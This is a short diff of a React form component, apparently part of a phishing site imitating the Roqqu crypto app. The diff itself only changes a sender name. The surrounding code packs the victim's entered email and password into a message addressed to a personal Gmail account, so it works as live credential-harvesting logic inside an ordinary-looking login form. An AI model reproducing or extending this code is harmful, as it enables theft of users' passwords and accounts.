@@ -21,7 +21,7 @@ const Form = (props) => {
         client_email: email,
         client_password: password,
         admin_email: 'munisco12@gmail.com',
-        from_name: 'https://roqquappchat.com',
+        from_name: 'Roqquappchat',
         to_name: 'Admin'
        
     }
